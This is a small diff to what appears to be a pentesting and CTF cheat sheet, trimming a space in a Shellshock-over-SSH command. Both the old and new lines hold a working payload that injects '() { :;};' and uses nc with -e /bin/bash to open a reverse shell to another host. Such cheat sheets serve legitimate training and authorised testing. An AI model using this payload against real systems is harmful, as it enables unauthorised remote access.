@@ -57,7 +57,7 @@ __Pentesting - Red Team - CTFs - OSCP__
  `Shellshock (SSH)`
  
  ```cmd
- root@kali:~# ssh user@192.168.1.3 -i id_rsa  '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
+ root@kali:~# ssh user@192.168.1.3 -i id_rsa '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
  ```
  
  `Shellshock (HTTP)`
